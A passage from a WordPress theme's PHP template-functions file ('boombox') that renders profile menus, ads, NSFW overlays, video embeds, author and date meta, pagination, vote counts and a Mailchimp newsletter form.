					'icon_class' => esc_attr( 'icon-comments' )
				),
				'my-comments'   => array(
					'label'      => esc_html__( 'Comments by me', 'boombox' ),
					'icon_class' => esc_attr( 'icon-comment' )
				),
				'logout'        => array(
					'label'      => esc_html__( 'Log out', 'boombox' ),
					'icon_class' => esc_attr( 'icon-sign-out' ),
					'url'        => wp_logout_url( home_url() )
				)
			);

			if ( boombox_is_plugin_active( 'viralpress/viralpress.php' ) ) {
				$profile_nav_items['dashboard']['url']     = esc_url( site_url( '/dashboard' ) );
				$profile_nav_items['profile']['url']       = esc_url( site_url( '/profile' ) );
				$profile_nav_items['my-posts']['url']      = esc_url( site_url( '/profile' ) );
				$profile_nav_items['post-comments']['url'] = esc_url( site_url( '/post-comments' ) );
				$profile_nav_items['my-comments']['url']   = esc_url( site_url( '/my-comments' ) );
			} else {
				$ssl = is_ssl() ? 'https' : 'http';
				$profile_nav_items['dashboard']['url'] = admin_url( 'profile.php', $ssl );
				$profile_nav_items['profile']['url']   = admin_url( 'profile.php', $ssl );
				$profile_nav_items['my-posts']['url']  = admin_url( 'edit.php', $ssl );
			}

			$nav_item_html = '';
			foreach ( $profile_nav_items as $profile_nav_item ) {
				if ( isset( $profile_nav_item['url'] ) && ! empty( $profile_nav_item['url'] ) ) {
					$nav_item_html .= sprintf( '<li><a href="%1$s"><i class="icon %2$s"></i>%3$s</a></li>',
						$profile_nav_item['url'],
						$profile_nav_item['icon_class'],
						$profile_nav_item['label'] );
				}
			}

			if ( ! empty( $nav_item_html ) ):
				$nav_items_html = sprintf( '<div class="menu"><ul>%1$s</ul></div>', $nav_item_html );
			endif;

			$url             = $profile_nav_items['dashboard']['url'];
			$profile_picture = get_avatar( $current_user_id, 150 );
			if ( ! $profile_picture ) {
				$profile_picture = '<i class="icon-user"></i>';
			}
		}

	} else {
		$profile_class   = 'js-authentication';
		$url             = esc_url( '#sign-in' );
		$profile_picture = '<i class="icon-user"></i>';
	}

	$classes = esc_attr( implode( ' ', $classes ) );

	$html = sprintf( '<div class="user-box %1$s"><a class="%2$s" href="%3$s">%4$s</a>%5$s</div>',
		$classes,
		$profile_class,
		$url,
		$profile_picture,
		$nav_items_html
	);

	return $html;
}

/**
* Trigger an action to render user notifications
 */
function boombox_user_notifications_box() {
	do_action( 'boombox_user_notifications' );
}

/**
 * Return Log Out Button
 *
 * @return string
 */
function boombox_get_logout_button() {
	if ( is_user_logged_in() ) {
		$url     = wp_logout_url( home_url() );
		$title   = esc_attr__( 'Log Out', 'boombox' );
		$classes = esc_attr( implode( ' ', array( 'user', 'icon-sign-out' ) ) );

		return sprintf( '<a class="%1$s" href="%2$s" title="%3$s"></a>',
			$classes,
			$url,
			$title
		);
	}

	return '';
}

/**
 * Return point classes
 *
 * @param $post_id
 *
 * @return array
 */
function boombox_get_point_classes( $post_id ){
	$classes = array(
		'up' => '',
		'down' => ''
	);

	if( Boombox_Point_Count_Helper::pointed_up($post_id) ){
		$classes[ 'up' ] = 'active';
	} else if ( Boombox_Point_Count_Helper::pointed_down($post_id) ) {
		$classes[ 'down' ] = 'active';
	}

	return $classes;
}

/**
 * Return post point count
 *
 * @param $post_id
 *
 * @return int
 */
function boombox_get_post_point_count( $post_id ){
	return Boombox_Point_Count_Helper::get_post_points( $post_id );
}

/**
 * Return views count
 *
 * @param $post_id
 *
 * @return int
 */
function boombox_get_views_count( $post_id ){
	return Boombox_View_Count_Helper::get_post_views( $post_id );
}

/**
 * Show advertisement
 *
 * @param $location
 * @param string $classes
 * @param bool $tmp_query
 * @param bool $cur_query
 */
function boombox_the_advertisement( $location, $classes='', $tmp_query = false, $cur_query = false ){
	global $wp_query;
	$hide_adds = false;
	if( is_singular() ){
		global $post;
		$config = get_post_meta( $post->ID, '_quads_config_visibility', true );
		if( isset( $config['NoAds'] ) && true == $config['NoAds'] ){
			$hide_adds = true;
		}
	}
	if( $tmp_query ) {
		$wp_query = $tmp_query;
	}
	if( $location && boombox_is_plugin_active('quick-adsense-reloaded/quick-adsense-reloaded.php') && function_exists('quads_ad') && quads_has_ad( $location ) && !$hide_adds ){
		if(is_array($classes)){
			$classes = trim( implode(' ', $classes) );
		}
		$tag = 'div';
		$post_class_pos = strpos( $classes, 'post');
		if( $post_class_pos || 0 == $post_class_pos ){
			$tag = 'article';
		}
		$adv = quads_ad( array( 'location' => $location, 'echo' => false ) ); ?>
		<<?php echo $tag; ?> class="advertisement <?php echo esc_attr( $classes ); ?>">
			<div class="inner">
				<?php
				if( !empty( $adv ) ):
					echo $adv;
				else: ?>
					<div class="massage">
						<?php esc_html_e( 'There are no ads set to this area or maximum limit of ads on a single page has been reached', 'boombox' ); ?>
					</div>
					<?php
				endif; ?>
			</div>
		</<?php echo $tag; ?>>
		<?php
	}
	if( $cur_query ) {
		$wp_query = $cur_query;
	}
}

/**
 * Return advertisement settings
 *
 * @param $listing_type
 *
 * @return array
 */
function boombox_get_adv_settings( $listing_type ){
	if( in_array( $listing_type, array( 'grid', 'three-column' ) ) ) {
		$size = '';
		$location = 'boombox-listing-type-grid-instead-post';
	} else {
		$size = 'large';
		$location = 'boombox-listing-type-non-grid-instead-post';
	}
	return array(
		'size' => $size,
		'location' => $location
	);
}

/**
 * Check, if adv is enabled
 *
 * @param $ad
 *
 * @return bool
 */
function boombox_is_adv_enabled( $ad ){
	if( boombox_is_plugin_active( 'quick-adsense-reloaded/quick-adsense-reloaded.php' ) && 'inject_into_posts_list' == $ad ){
		return true;
	}
	return false;
}

/**
 * Check, if newsletter is enabled
 *
 * @param $newsletter
 *
 * @return bool
 */
function boombox_is_newsletter_enabled( $newsletter ){
	if( boombox_is_plugin_active( 'mailchimp-for-wp/mailchimp-for-wp.php' ) && 'inject_into_posts_list' == $newsletter ){
		return true;
	}
	return false;
}

/**
 * Change theme pagination html
 *
 * @param $args
 *
 * @return array
 */
function boombox_wp_link_pages_args( $args ){
	$args = array_merge(
		$args,
		array(
			'before'           => '<nav class="navigation page-links" role="navigation"><div class="nav-links">',
			'after'            => '</div></nav>',
			'link_before'      => '<span>',
			'link_after'       => '</span>',
			'next_or_number'   => 'number',
			'previouspagelink' => esc_html__( 'Previous', 'boombox' ),
			'nextpagelink'     => esc_html__( 'Next', 'boombox' )
		)
	);

	return $args;
}

/**
 * Add text before mailchimp form
 *
 * @param $html
 *
 * @return string
 */
function boombox_mc4wp_form_before_form( $html ){
	$html .= '<p><b>' . esc_html__( 'LIKE WHAT YOU\'RE READING?', 'boombox' ) . '</b><br/> ' . esc_html__( 'subscribe to our top stories', 'boombox' ) . '</p>';

	return $html;
}

/**
 * Add text after mailchimp form
 *
 * @param $html
 *
 * @return string
 */
function boombox_mc4wp_form_after_form( $html ){
	$html .= '<small>' . esc_html__( 'Don\'t worry, we don\'t spam', 'boombox' ) . '</small>';

	return $html;
}

/**
 * Wrap embeds in wrapper
 *
 * @param $html
 * @param $url
 * @param $attr
 *
 * @return string
 */
function boombox_wrapper_embed_oembed_html( $html, $url, $attr ) {
	$is_video = false;
	$is_vine_video = false;

	$domains = array(
		'youtube.com',
		'youtu.be',
		'vimeo.com',
		'dailymotion.com',
		'vine.co'
	);
	foreach ( $domains as $domain ) {
		if ( strpos( $url, $domain ) !== false ) {
			if( 'vine.co' == $domain ){
				$is_vine_video = true;
			}
			$is_video = true;
			break;
		}
	}

	if ( $is_video ) {
		return sprintf( '<div class="boombox-responsive-embed %1$s">%2$s</div>', $is_vine_video ? esc_attr( 'vine-embed' ) : '', $html );
	}
	return $html;
}

/**
 * Override video player dimensions
 *
 * @param $out
 * @param $pairs
 * @param $atts
 *
 * @return mixed
 */
function boombox_shortcode_atts_video( $out, $pairs, $atts ){
	global $content_width;
	$out['width']  = $content_width;
	$out['height'] = round( $content_width * $out['height'] / $out['width'] );

	return $out;
}

/**
 * Get video iframe
 *
 * @param int $post_id
 *
 * @return bool|string
 */
function boombox_get_post_viral_video( $post_id = 0 ){
	if( 0 == $post_id ){
		global $post;
		if( is_object( $post ) ){
			$post_id = $post->ID;
		}
	}

	$post = get_post( $post_id );

	if( !$post ){
		return false;
	}

	$video = false;
	if ( boombox_is_plugin_active( 'viralpress/viralpress.php' ) && 'videos' == get_post_meta( get_the_ID(), 'vp_post_type', true ) ) {
		$childs = get_post_meta( $post_id, 'vp_child_post_ids' );
		$childs = end( $childs );
		$childs = explode( ',', $childs );

		$order = get_post_meta( $post_id, 'vp_sort_order' );
		$order = end( $order );

		if ( $order == 'desc' ) {
			$childs = array_reverse( $childs, true );
		}

		foreach ( $childs as $child ) {
			$child_post = get_post( $child );
			$type       = $child_post->post_type;
			$pid        = $child;
			if ( $type == 'video' || $type == 'videos' ) {
				$eid = get_post_meta( $pid, 'vp_video_entry' );
				$eid = end( $eid );
				if ( verify_video_entry_value( $eid ) ) {
					$elem_id = rand() . time();
					$code    = get_embed_code( $eid, $elem_id );
					$video   = sprintf( '<div class="boombox-responsive-embed">%1$s</div>', $code );
					break;
				}
			}
		}
	}
	return $video;
}

/**
 * Get NSFW category id
 *
 * @return bool|int
 */
function boombox_get_nsfw_category_id(){
	if ( term_exists( 'nsfw', 'category' ) ) {
		$nsfw = get_term_by('slug', 'nsfw', 'category');
		if( $nsfw ){
			return $nsfw->term_id;
		}
	}
	return false;
}

/**
 * Add to post thumbnail NSFW message
 *
 * @param $html
 * @param $post_id
 * @param $post_thumbnail_id
 * @param $size
 * @param $attr
 *
 * @return string
 */
function boombox_post_thumbnail_fallback( $html, $post_id, $post_thumbnail_id, $size, $attr ) {
	if( 'boombox_image768' == $size || 'boombox_image545' == $size ){
		$post_thumbnail = wp_get_attachment_image_src( $post_thumbnail_id, 'full' );
		if(  'gif' == strtolower( substr( $post_thumbnail[0], -3) ) ){
			$html = get_the_post_thumbnail( $post_id, 'full', $attr );
		}
	}

	if( boombox_is_nsfw_post( $post_id ) ){
		$html .= boombox_get_nsfw_message();
	}

	return $html;
}

/**
 * NSFW message
 *
 * @return string
 */
function boombox_get_nsfw_message(){
	$html = sprintf( '<div class="nsfw-post"><div class="nsfw-content"><i class="icon icon-skull"></i><h3>%1$s</h3><p>%2$s</p></div></div>',
		esc_html__( 'Not Safe For Work', 'boombox' ),
		esc_html__( 'Click to view this post.', 'boombox' )
	);
	return $html;
}

function boombox_post_thumbnail_caption( $echo = true ){
	$caption = get_the_post_thumbnail_caption();
	if( $caption ) {
		$html = sprintf( '<div class="thumbnail-caption">%s</div>', get_the_post_thumbnail_caption() );
		if( $echo ) {
			echo $html;
		} else {
			return $html;
		}
	}
}

/**
 * Return true, if is NSFW post
 *
 * @param $post_id
 *
 * @return bool
 */
function boombox_is_nsfw_post( $post_id = 0 ){
	if( 0 == $post_id ){
		global $post;
		if( is_object( $post ) ){
			$post_id = $post->ID;
		}
	}

	static $checked_posts;
	$checked_posts = $checked_posts ? $checked_posts : array();

	if( ! isset( $checked_posts[ $post_id ] ) ) {
		$checked_posts[ $post_id ] = ( has_category( 'nsfw', $post_id ) && ! is_user_logged_in() );
	}

	return $checked_posts[ $post_id ];
}

/**
 * Get Post Featured Video
 *
 * @param int $post_id
 * @param $featured_image_size
 *
 * @return string
 */
function boombox_get_post_featured_video( $post_id = 0, $featured_image_size = 'full' ){
	$featured_video_html = '';
	if ( 0 === $post_id ) {
		global $post;
		if ( is_object( $post ) ) {
			$post_id = $post->ID;
		}
	}

	if ( ! $post_id ) {
		return $featured_video_html;
	}

	$featured_video_url = get_post_meta( $post_id, 'boombox_video_url', true );

	if ( !empty( $featured_video_url ) ) {

		$featured_image       	= wp_get_attachment_image_src( get_post_thumbnail_id( $post_id ), $featured_image_size );
		$featured_image_src   	= isset( $featured_image[0] ) ? $featured_image[0] : '';
		$featured_image_style	= $featured_image_src ? 'style="background-image:url(' . esc_url( $featured_image_src ) . ')"' : '';
		$featured_image_class 	= !$featured_image_src ? esc_attr( 'no-thumbnail' ) : '';
		$featured_video 		= array();

		while( true ) {
			$featured_video_type  = wp_check_filetype( $featured_video_url );

			if( isset( $featured_video_type['type'] ) && $featured_video_type['type'] ) {

				$html  = '<video width="100%" height="auto" loop muted ><source src="' . esc_url( $featured_video_url ) . '" type="' . $featured_video_type['type'] . '"> <img src="' . esc_url( $featured_image_src ) . '" title="' . esc_html__( 'To view this video please enable JavaScript, and consider upgrading to a web browser that supports HTML5 video', 'boombox' ) . '"></video>';
				$html .= '<i class="icon icon-play"></i><i class="icon-volume icon-volume-off"></i>';
				$featured_video = array(
					'type' 		=> $featured_video_type['type'],
					'before' 	=> sprintf( '<div class="video-wrapper %1$s" %2$s>', $featured_image_class, $featured_image_style ),
					'after'		=> '</div>',
					'html' 		=> $html
				);
				break;
			}

			preg_match( boombox_get_regex( 'youtube' ), $featured_video_url, $youtube_matches );
			if( isset( $youtube_matches[1] ) && $youtube_matches[1] ) {
				$iframe_atts = array(
					'type="text/html"',
					'width="100%"',
					'height="376"',
					'src="' . sprintf( 'https://www.youtube.com/embed/%1$s?%2$s', $youtube_matches[1], build_query( array( 'autoplay' => 0 ) ) ) . '"',
					'frameborder="0"'
			 	);
			 	$html = sprintf( '<iframe %s></iframe>', implode( ' ', $iframe_atts ) );
				$featured_video = array(
					'type' 		=> 'youtube',
					'id' 		=> $youtube_matches[1],
					'before' 	=> sprintf( '<div class="video-wrapper %1$s">', $featured_image_class ),
					'after'		=> '</div>',
					'html'		=> $html
				);
				break;
			}

			preg_match( boombox_get_regex( 'vimeo' ) , $featured_video_url, $vimeo_matches );
			if( isset( $vimeo_matches[5] ) && $vimeo_matches[5] ) {
				$iframe_atts = array(
					'type="text/html"',
					'width="100%"',
					'height="376"',
					'src="' . sprintf( '//player.vimeo.com/video/%1$s?%2$s', $vimeo_matches[5], build_query( array( 'autopause' => 1, 'badge' => 0, 'byline' => 0, 'loop' => 0, 'title' => 0, 'autoplay' => 0 ) ) ) . '"',
					'frameborder="0"'
				);
				$html = sprintf( '<iframe %s></iframe>', implode( ' ', $iframe_atts ) );
				$featured_video = array(
					'type' 	=> 'vimeo',
					'id' 	=> $vimeo_matches[5],
					'before' 	=> sprintf( '<div class="video-wrapper %1$s">', $featured_image_class ),
					'after'		=> '</div>',
					'html'	=> $html
				);
				break;
			}

			break;
		}

		$featured_video_html  = ! empty( $featured_video ) ? ( $featured_video['before'] . $featured_video['html'] . $featured_video['after'] ) : '';
		$featured_video_html .= boombox_is_nsfw_post( $post_id ) ? boombox_get_nsfw_message() : '';
	}

	return $featured_video_html;
}

/**
 * These functions can be rewritten with a child theme
 */

if ( ! function_exists( 'boombox_post_date' ) ) {

	/**
 	* Prints HTML with date information for current post.
 	*
	* @param array $args
 	* @return string
 	*/
	function boombox_post_date( $args = array() ) {

		$args = wp_parse_args( $args, array(
			'echo' => true
		) );

		$html = '';
		if ( 'post' === get_post_type() ) {

			$time_string = sprintf( '<time class="entry-date published updated" datetime="%1$s">%2$s</time>',
				esc_attr( get_the_date( 'c' ) ),
				apply_filters( 'boombox_post_date' , human_time_diff( get_the_time( 'U' ), current_time( 'timestamp' ) ) . " " . esc_html__( 'ago', 'boombox' ) )
			);

			$html .= sprintf( '<span class="posted-on"><a href="%1$s" rel="bookmark">%2$s</a></span>',
				esc_url( get_permalink() ),
				$time_string
			);
		}

		if( $args['echo'] ) {
			echo $html;
		} else {
			return $html;
		}
	}
}

if( ! function_exists('boombox_post_author_meta') ) {

	/**
	* Create a meta box for the post author with author and date data
 	*
	* @param array $args
	* @return string
	*/
	function boombox_post_author_meta( $args = array() ) {

		$args = wp_parse_args( $args, array(
			'before' 		=> '<div class="post-author-meta">',
			'after'  		=> '</div>',
			'author' 		=> true,
			'author_args' 	=> array(),
			'date'	 		=> true,
			'date_args' 	=> array(),
			'echo'   		=> true
		) );

		$html = '';
		if( $args['author'] ) {
			$html .= boombox_post_author( array_merge( (array)$args['author_args'], array( 'echo' => false ) ) );
		}

		if( $args['date'] ) {
			$html .= boombox_post_date( array_merge( (array)$args['date_args'], array( 'echo' => false ) ) );
		}

		if( $html ) {
			$html = $args['before'] . $html . $args['after'];
		}

		if( $args['echo'] ) {
			echo $html;
		} else {
			return $html;
		}

	}

}

if ( ! function_exists( 'boombox_post_author' ) ) {
	/**
	* Prints HTML with author information for current post.
	*
	* @param array $args
	* @return string
	*/
	function boombox_post_author( $args = array() ) {

		$args = wp_parse_args( $args, array(
			'with_avatar' 		=> false,
			'post_author_id'	=> false,
			'long_text'			=> false,
			'with_desc'			=> false,
			'echo'				=> true
		) );

		$html = '';
		if ( 'post' === get_post_type() ) {
			$author_id = $args['post_author_id'] ? $args['post_author_id'] : get_the_author_meta( 'ID' );
			if ( true == $args[ 'with_avatar' ] ) {
				$author_avatar_size = apply_filters( 'boombox_author_avatar_size', 74 );
				$html .= sprintf( '<div class="avatar circle-frame"><a class="url" href="%1$s">%2$s</a></div>',
					esc_url( get_author_posts_url( $author_id ) ),
					get_avatar( $author_id, $author_avatar_size )
				);
			}
			$author_name = sprintf( '<span class="byline"><span class="author vcard">%1$s <a class="url" href="%2$s">%3$s</a></span></span>',
				true == $args['long_text'] ? esc_html__( 'Posted by', 'boombox' ) : esc_html__( 'By', 'boombox' ),
				esc_url( get_author_posts_url( $author_id ) ),
				wp_kses_post( get_the_author_meta( 'display_name', $author_id ) )
			);

			$description = '';
			if( $args['with_desc'] ){
				$description = sprintf( '<div class="about"><p class="text">%1$s</p></div>',
					wp_kses_post( get_the_author_meta( 'description' ) )
				);
			}

			if( $author_name || $description ) {
				$html .= sprintf( '<div class="author-info">%1$s %2$s</div>',
					$author_name,
					$description
				);
			}
		}

		if( $args['echo'] ) {
			echo $html;
		} else {
			return $html;
		}
	}
}

if ( ! function_exists( 'boombox_post_author_short_info' ) ) {
	/**
	 * Prints HTML with author short information for current post.
	 */
	function boombox_post_author_short_info() {
		if ( is_singular() || is_author()) {
			?>
			<div class="author-vcard">
				<?php boombox_post_author( array('with_avatar' => true, 'post_author_id' => false, 'long_text' => true, 'with_desc' => true) ); ?>
			</div>
		<?php
		}
	}
}

if( ! function_exists( 'boombox_single_post_link_pages' ) ) {
	/**
	* Prints HTML for single post link pages navigation
	*/
	function boombox_single_post_link_pages( $args = '' ) {

		global $page, $numpages, $multipage, $more;

		$defaults = array(
			'before'           		=> '<p>' . __( 'Pages:' ),
			'after'            		=> '</p>',
			'link_before'      		=> '',
			'link_after'       		=> '',
			'paging'           		=> '',
			'reverse'				=> 0,
			'next'			   		=> 1,
			'prev'			   		=> 1,
			'previous_page_link' 	=> __( 'Previous page' ), 		// paginated prev page
			'next_page_link'     	=> __( 'Next page' ),     		// paginated next page
			'previous_post_link'   	=> __( 'Previous post' ),		// prev page
			'next_post_link'   		=> __( 'Next post' ),			// next page
			'go_to_prev_next'  		=> 1,
			'pagelink'        		=> '%',
			'link_wrap_before' 		=> '',
			'link_wrap_after'  		=> '',
			'echo'             		=> 1
		);
		$r = wp_parse_args( $args, $defaults );

		$prev_output = $next_output = '';
		$prev_classes = array( 'prev-page' );
		$next_classes = array( 'next-page' );

		if( $multipage && $more ) {

			// previous page
			if( $r['prev'] ) {
				$prev = $page - 1;
				if ( $prev > 0 ) {

					$link = _wp_link_page( $prev ) . $r['link_before'] . $r['previous_page_link'] . $r['link_after'] . '</a>';
					$prev_output = apply_filters( 'wp_link_pages_link', $link, $prev );

				} elseif( $r['go_to_prev_next'] && $boombox_post = ( $r['reverse'] ? get_next_post() : get_previous_post() ) ) {

					$prev_output = sprintf( '<a href="%s">', esc_url( get_permalink( $boombox_post->ID ) ) ) . $r['link_before'] . $r['previous_post_link'] . $r['link_after'] . '</a>';

				} else {

					$prev_output = sprintf( '<a href="%s">', 'javascript:void(0)' ) . $r['link_before'] . $r['previous_post_link'] . $r['link_after'] . '</a>';
					$prev_classes[] = 'disabled';

				}

			}

			// next page
			if( $r[ 'next' ] ) {
				$next = $page + 1;
				if ( $next <= $numpages ) {

					$link = _wp_link_page( $next ) . $r['link_before'] . $r['next_page_link'] . $r['link_after'] . '</a>';
					$next_output = apply_filters( 'wp_link_pages_link', $link, $next );

				} elseif( $r['go_to_prev_next'] && $boombox_post = ( $r['reverse'] ? get_previous_post() : get_next_post() ) ) {

					$next_output = sprintf( '<a href="%s">', esc_url( get_permalink( $boombox_post->ID ) ) ) . $r['link_before'] . $r['next_post_link'] . $r['link_after'] . '</a>';

				} else {

					$next_output = sprintf( '<a href="%s">', 'javascript:void(0)' ) . $r['link_before'] . $r['next_post_link'] . $r['link_after'] . '</a>';
					$next_classes[] = 'disabled';

				}
			}

		}

		if( ! $prev_output && $r['prev'] ) {
			if( $r['go_to_prev_next'] && $boombox_post = ( $r['reverse'] ? get_next_post() : get_previous_post() ) ) {
				$prev_output = sprintf( '<a href="%s">', esc_url( get_permalink( $boombox_post->ID ) ) ) . $r['link_before'] . $r['previous_post_link'] . $r['link_after'] . '</a>';
			} else {
				$prev_output = sprintf( '<a href="%s">', 'javascript:void(0)' ) . $r['link_before'] . $r['previous_post_link'] . $r['link_after'] . '</a>';
				$prev_classes[] = 'disabled';
			}
		}

		if( !$next_output && $r['next'] ) {
			if( $r['go_to_prev_next'] && $boombox_post = ( $r['reverse'] ? get_previous_post() : get_next_post() ) ) {
				$next_output = sprintf( '<a href="%s">', esc_url( get_permalink( $boombox_post->ID ) ) ) . $r['link_before'] . $r['next_post_link'] . $r['link_after'] . '</a>';
			} else {
				$next_output = sprintf( '<a href="%s">', 'javascript:void(0)' ) . $r['link_before'] . $r['next_post_link'] . $r['link_after'] . '</a>';
				$next_classes[] = 'disabled';
			}
		}

		$r['paging'] = ( $numpages > 1 ) ? $r['paging'] : '';

		$prev_output = sprintf( $r['link_wrap_before'], implode( ' ', $prev_classes )  ) . $prev_output . $r['link_wrap_after'];
		$next_output = sprintf( $r['link_wrap_before'], implode( ' ', $next_classes )  ) . $next_output . $r['link_wrap_after'];

		$output = $r['before'] . $prev_output . $r['paging'] . $next_output . $r['after'];

		if ( $r['echo'] ) {
			echo $output;
		}
		return $output;

	}
}

if( !function_exists( 'boombox_show_thumbail' ) ) {

	function boombox_show_thumbail() {
		global $page, $numpages, $multipage, $more;

		return $multipage ? ( $page == 1 ) : true;
	}

}

if ( ! function_exists( 'boombox_the_post_subtitle' ) ) {
	/**
	 * Prints HTML with subtitle for current post.
	 */
	function boombox_the_post_subtitle() {
		global $post;

		if ( get_post_type() == 'post' ) {
			if( is_single() ){
				$boombox_subtitle = $post->post_excerpt;
			} else {
				$excerpt_length   = apply_filters( 'excerpt_length', 25 );
				$excerpt_more     = apply_filters( 'excerpt_more', ' ' . '[&hellip;]' );
				$boombox_subtitle = wp_trim_words( get_the_excerpt( $post ), $excerpt_length, $excerpt_more );
			}

			if ( ! empty( $boombox_subtitle ) ) {
				?>
				<h3 class="entry-sub-title"><?php echo wp_kses_post( $boombox_subtitle ); ?></h3>
			<?php
			}
		}
	}
}

if ( ! function_exists( 'boombox_post_share_count' ) ) {
	/**
	 * Prints HTML with share count for current post.
	 */
	function boombox_post_share_count( $html = true, $echo = true ) {
		if ( boombox_is_plugin_active( 'mashsharer/mashshare.php' ) && 'post' === get_post_type() ) {

			/* Old functionality
			$share_count = do_shortcode( '[mashshare buttons="false"]' );
			$share_count = trim( wp_strip_all_tags( $share_count ) );
			$share_count = explode(' ', $share_count );
			if( 0 == substr($share_count[0], 0, 1) ){
				$share_count[0] = 0;
			}
			$count = isset( $share_count[0] ) ? $share_count[0] : 0;

			$return = '';
			if( $count ) {
				$count = preg_replace('/(?<=[a-z])(?=\d)|(?<=\d)(?=[a-z])/i', ' ', $count);
				$return = $html ? sprintf( '<span class="post-share-count"><i class="icon icon-share"></i>%s</span>', $count ) : $count;
			}
			/end Old functionality */

			/** new functionality */
			global $mashsb_options;
			$count = roundshares( get_post_meta( get_the_ID(), 'mashsb_shares', true ) + getFakecount() );

			$return = '';
			if( $count ) {
				$count .= ( isset( $mashsb_options['sharecount_title'] ) && $mashsb_options['sharecount_title'] ) ? sprintf(' %s', $mashsb_options['sharecount_title']) : '';
				$return = $html ? sprintf( '<span class="post-share-count"><i class="icon icon-share"></i>%s</span>', $count ) : $count;
			}
			/** /end new functionality */

			if( $echo ) {
				echo $return;
			} else {
				return $return;
			}
		}
	}
}

if( !function_exists( 'boombox_post_view_vote_count' ) ) {
	/**
 	* Prints HTML with views and votes count for provided post
 	*
	* @param $post_id
	* @param $show_views
	* @param $show_votes
 	*/
	function boombox_post_view_vote_count( $post_id, $show_views = true, $show_votes = true ) {

		$views_html = $show_views ? boombox_get_post_view_count_html( $post_id ) : '';
		$votes_html = $show_votes ? boombox_get_post_vote_count_html( $post_id ) : '';
		if( $show_views || $show_votes ) {
			printf( '<span class="post-meta-wrapper">%1$s%2$s</span>',
				$views_html,
				$votes_html
			);
		}

	}

}

if( ! function_exists( 'boombox_numerical_word' ) ) {
	/**
 	* Add numerical words to numbers
 	*
	* @param $number
	* @return string
	 */
	function boombox_numerical_word( $number ) {

		if( $number < 1000 ) {
			return $number;
		} elseif( $number <= 1000000 ) {
			$scale_to = 1000;
			$suffix = esc_html__('k', 'boombox');
		} else {
			$scale_to = 1000000;
			$suffix = esc_html__('M', 'boombox');
		}

		$precision = 1;
		$multiple = pow( 10, $precision );
		$number = round( ( $number / $scale_to )  * $multiple ) / $multiple;

		return sprintf( '%1$s%2$s', $number, $suffix );
	}

}

if( ! function_exists( 'boombox_get_post_view_count_html' ) ) {

	/**
 	* Generates HTMl for views count for provided post
 	*
	* @param $post_id
 	* @return string
 	*/
	function boombox_get_post_view_count_html( $post_id ) {
		return sprintf( '<span class="post-view-count"><i class="icon icon-eye"></i>%1$s</span>',
			boombox_numerical_word( boombox_get_views_count( $post_id ) )
		);
	}

}

if( ! function_exists( 'boombox_get_post_vote_count_html' ) ) {

	/**
 	* Generates HTMl for votes count for provided post
 	*
	* @param $post_id
 	* @return string
 	*/
	function boombox_get_post_vote_count_html( $post_id ) {
		return sprintf( '<span class="post-vote-count"><i class="icon icon-vote"></i>%1$s</span>',
			boombox_get_post_point_count( $post_id )
		);
	}

}

if ( ! function_exists( 'boombox_post_share_buttons' ) ) {
	/**
	 * Get share buttons
	 *
	 * @see Mashshare Plugin
	 * @return string
	 */
	function boombox_post_share_buttons() {
		echo do_shortcode( '[mashshare shares="false"]' );
	}
}

if( ! function_exists( 'boombox_post_share_buttons_mobile' ) ) {

	function boombox_post_share_mobile_buttons( $show_comments, $show_share, $show_points ) {

		$boombox_post_share_box_elements = array();
		if( $show_comments ) {
			$comments_count = get_comments_number();
			if( $comments_count ) {
				$boombox_post_share_box_elements[] = sprintf( '<span class="mobile-comments-count">%1$d</span> %2$s', $comments_count, esc_html__( 'comments', 'boombox' ) );
			}
		}
		if( $show_share ) {
			$boombox_post_share_box_elements[] = sprintf( '<span class="mobile-shares-count">%s</span>', boombox_post_share_count( false, false ) );
		}
		if( $show_points ) {
			$boombox_post_share_box_elements[] = sprintf( '<span class="mobile-votes-count">%1$d</span> %2$s', boombox_get_post_point_count( get_the_ID() ), esc_html__( 'points', 'boombox' ) );
		}

		if( !empty( $boombox_post_share_box_elements ) ) {
			echo sprintf( '<div class="mobile-info">%s</div>', implode(', ', $boombox_post_share_box_elements) );
		}

	}

}

if ( ! function_exists( 'boombox_mailchimp_form' ) ) {
	/**
 	* Newsletter Form HTML
	*
	* @see Mashshare Plugin
 	*
	* @param $args
 	* @return string
 	*/
	function boombox_mailchimp_form( $args = '' ) {
		$html = '';

		$args = wp_parse_args( $args, array(
			'location' 	=> '',
			'classes'	=> '',
			'echo'		=> true
		) );

		if ( boombox_is_plugin_active( 'mailchimp-for-wp/mailchimp-for-wp.php' ) ) {
			$class_attr = '';
			if( is_array( $args['classes'] ) ) {
				$args['classes'] = trim( implode(' ', $args['classes']) );
			}
			$args['classes'] = 'newsletter-box ' . trim( $args['classes'] );
			$class_attr = 'class="' . wp_kses_post( $args['classes'] ) . '"';

			$tag = 'div';
			if( 'listing' == $args['location'] ){
				$tag = 'article';
			}

			add_filter( 'mc4wp_form_before_fields', 'boombox_mc4wp_form_before_form', 10, 2 );
			$html .= sprintf(
				'<%1$s %2$s>
					<div class="widget widget_mc4wp_form_widget horizontal">
						<h2 class="widget-title">%3$s</h2>
						%4$s
					</div>
				</%1$s>',
				$tag,
				$class_attr,
				esc_html__( 'Get The Newsletter', 'boombox' ),
				do_shortcode( '[mc4wp_form]' )
			);
			add_filter( 'mc4wp_form_after_fields', 'boombox_mc4wp_form_after_form', 10, 2 );
		}

		if( $args['echo'] ) {
			echo $html;
		} else {
			return $html;
		}
	}
}

if ( ! function_exists( 'boombox_post_points' ) ) {
	/**
	 * Get post points
	 */
	function boombox_post_points( $html = true ){
		global $post;

		if( $html ) {
			$point_classes = boombox_get_point_classes( $post->ID );
			$points_login_require = boombox_get_theme_option( 'settings_rating_points_login_require' );
			$container_class = 'js-post-point';
			$authentication_url = '';
			$authentication_tag = 'button';
			if( $points_login_require == true && !is_user_logged_in() ) {
				$point_classes['up'] .= ' js-authentication';
				$point_classes['down'] .= ' js-authentication';
				$authentication_url = esc_url( '#sign-in' );
				$container_class = '';
				$authentication_tag = 'a';
			}
			$authentication_href = !empty($authentication_url) ? 'href="' . $authentication_url . '"' : ''; ?>
			<div class="post-rating <?php echo esc_attr( $container_class ); ?>" data-post_id="<?php echo $post->ID; ?>">
				<div class="inner">
					<<?php echo $authentication_tag; ?> <?php echo $authentication_href; ?> class="up point-btn <?php echo esc_attr( $point_classes['up'] ); ?>" data-action="up">
						<i class="icon-arrow-up"></i>
					</<?php echo $authentication_tag; ?>>
					<<?php echo $authentication_tag; ?> <?php echo $authentication_href; ?> class="down point-btn <?php echo esc_attr( $point_classes['down'] ); ?>" data-action="down">
						<i class="icon-arrow-down"></i>
					</<?php echo $authentication_tag; ?>>
					<span class="count">
